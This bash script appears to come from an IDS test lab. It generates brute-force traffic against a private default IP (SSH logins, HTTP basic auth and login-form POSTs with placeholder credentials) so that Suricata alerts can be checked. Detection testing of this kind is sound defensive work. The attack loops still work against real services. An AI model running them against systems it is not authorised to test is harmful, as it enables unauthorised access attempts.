#!/bin/bash

# Brute Force Attack Scenario
# Triggers authentication brute force detection

TARGET="${1:-172.20.0.50}"

echo "[*] Brute Force Attack Scenario"
echo "[*] Target: $TARGET"
echo ""

echo "[1] SSH Brute Force Simulation..."
echo "[*] Attempting multiple SSH connections..."
for i in {1..10}; do
    echo "[*] Attempt $i/10"
    timeout 2 ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 \
        "user$i@$TARGET" "exit" 2>/dev/null || true
    sleep 1
done

echo ""
echo "[2] HTTP Basic Auth Brute Force..."
for i in {1..15}; do
    curl -s --basic -u "admin:password$i" "http://$TARGET/admin" >/dev/null
    sleep 0.5
done

echo ""
echo "[3] Login Form Brute Force..."
for i in {1..20}; do
    curl -s -X POST "http://$TARGET/login" \
        -d "username=admin&password=pass$i" >/dev/null
    sleep 0.3
done

echo ""
echo "[*] Brute force scenario complete!"
echo "[*] Check Suricata alerts for brute force attempts"
